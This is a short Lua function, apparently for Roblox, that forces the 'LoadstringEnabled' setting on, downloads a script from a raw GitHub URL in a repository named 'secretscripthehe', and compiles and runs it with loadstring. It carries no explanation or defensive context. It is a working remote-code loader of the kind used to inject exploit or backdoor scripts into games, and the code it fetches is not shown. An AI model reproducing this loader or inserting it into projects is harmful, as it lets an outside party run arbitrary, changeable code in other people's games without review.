local function runScript()
	settings().Diagnostics:Override("LoadstringEnabled", true)

	local url = "https://raw.githubusercontent.com/learyu-gah/secretscripthehe/main/edited_ranoveradeer.lua"
	local success, err = pcall(function()
		local response = game:HttpGet(url)
		local func = loadstring(response)
		if func then
			func()
		else
			warn("Could not compile the script")
		end
	end)

	if not success then
		warn("Failed to run external script:", err)
	end
end
